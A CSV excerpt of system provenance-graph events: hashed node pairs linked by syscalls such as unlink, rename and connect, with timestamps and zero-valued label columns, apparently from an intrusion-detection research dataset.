id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156365.0,1701560822.319,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156367.0,1701560826.151,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156369.0,1701560829.979,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156371.0,1701560833.807,unlink,,,,,,,,,,,,,,,0,0,28359347
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,1cee3607b760fc5b7884c9d6c531dfbc,,,,,,,,,syscall,,,,156372.0,1701560835.111,rename (read),,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,8a06a88a53f772ae35a415397dd94722,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156372.0,1701560835.111,rename (write),,,,,,,,,,,,,,,0,0,28359347
,WasDerivedFrom,8a06a88a53f772ae35a415397dd94722,1cee3607b760fc5b7884c9d6c531dfbc,,,,,,,1950.0,,syscall,,,,156372.0,1701560835.111,rename,,,,,,,,,,,,,,,0,0,28359347
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f13ca6e847fab95e87ac04f272c1a25a,,,,,,,,,syscall,,,,156373.0,1701560835.111,rename (read),,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,8d162c4a73d8b3772c519a091ef75b24,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156373.0,1701560835.111,rename (write),,,,,,,,,,,,,,,0,0,28359347
,WasDerivedFrom,8d162c4a73d8b3772c519a091ef75b24,f13ca6e847fab95e87ac04f272c1a25a,,,,,,,1950.0,,syscall,,,,156373.0,1701560835.111,rename,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,7c34b3d6a293864acf74e08419b032c8,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,156374.0,1701560835.111,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,dfbf35e00fb82392d65db7829f3646f5,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156376.0,1701560837.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,156390.0,1701560838.435,unlink,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,3f6ef075d99770e4d5ad8bc1915e10e6,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156392.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,3b831b0c23fe63c5a0a05d7260489d32,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156394.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
,WasGeneratedBy,f75ec6ff0d673c0869e1e77ab58e17c8,cc44f00fd2184ddf20bfd02e620570e3,,,,,,,,,syscall,,,,156396.0,1701560839.843,connect,,,,,,,,,,,,,,,0,0,28359347
